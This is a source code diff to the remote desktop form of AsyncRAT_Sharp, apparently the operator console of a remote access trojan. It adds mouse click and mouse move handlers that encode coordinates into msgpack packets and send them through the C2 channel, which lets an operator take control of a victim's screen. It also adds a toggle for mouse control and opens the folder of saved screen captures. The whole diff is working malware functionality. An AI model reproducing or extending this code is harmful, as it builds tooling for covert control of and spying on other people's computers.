@@ -34,7 +34,8 @@ namespace AsyncRAT_Sharp.Forms
         public Stopwatch sw = Stopwatch.StartNew();
         public Stopwatch RenderSW = Stopwatch.StartNew();
         public IUnsafeCodec decoder = new UnsafeStreamCodec(60);
-
+        public Size rdSize;
+        private bool isMouse = false;
         private void timer1_Tick(object sender, EventArgs e)
         {
             if (!C.ClientSocket.Connected) this.Close();
@@ -106,17 +107,20 @@ namespace AsyncRAT_Sharp.Forms
 
         private void BtnSave_Click(object sender, EventArgs e)
         {
-            if (button1.Text == "STOP")
+            if (button1.Tag == (object)"stop")
             {
                 if (timerSave.Enabled)
                 {
                     timerSave.Stop();
-                    btnSave.Text = "START SAVE";
+                    btnSave.BackgroundImage = Properties.Resources.save_image;
                 }
                 else
                 {
                     timerSave.Start();
-                    btnSave.Text = "STOP SAVE";
+                    btnSave.BackgroundImage = Properties.Resources.save_image2;
+                    string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID);
+                    if (Directory.Exists(fullPath))
+                        Process.Start(fullPath);
                 }
             }
         }
@@ -151,6 +155,88 @@ namespace AsyncRAT_Sharp.Forms
                 }
             }
             return null;
+        }
+
+        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
+        {
+            try
+            {
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isMouse)
+                {
+                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    int button = 0;
+                    if (e.Button == MouseButtons.Left)
+                        button = 2;
+                    if (e.Button == MouseButtons.Right)
+                        button = 8;
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
+                    msgpack.ForcePathObject("X").AsInteger = p.X;
+                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
+                    msgpack.ForcePathObject("Button").AsInteger = button;
+                    ThreadPool.QueueUserWorkItem(C2.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
+
+        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
+        {
+            try
+            {
+                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isMouse)
+                {
+                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    int button = 0;
+                    if (e.Button == MouseButtons.Left)
+                        button = 4;
+                    if (e.Button == MouseButtons.Right)
+                        button = 16;
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
+                    msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
+                    msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
+                    msgpack.ForcePathObject("Button").AsInteger = (Int32)(button);
+                    ThreadPool.QueueUserWorkItem(C2.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
+
+        private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
+        {
+            try
+            {
+                if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
+                {
+                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
+                    msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
+                    msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
+                    ThreadPool.QueueUserWorkItem(C2.Send, msgpack.Encode2Bytes());
+                }
+            }
+            catch { }
+        }
+
+        private void Button3_Click(object sender, EventArgs e)
+        {
+            if (isMouse)
+            {
+                isMouse = false;
+                btnMouse.BackgroundImage = Properties.Resources.mouse;
+            }
+            else
+            {
+                isMouse = true;
+                btnMouse.BackgroundImage = Properties.Resources.mouse_enable;
+            }
         }
     }
 }
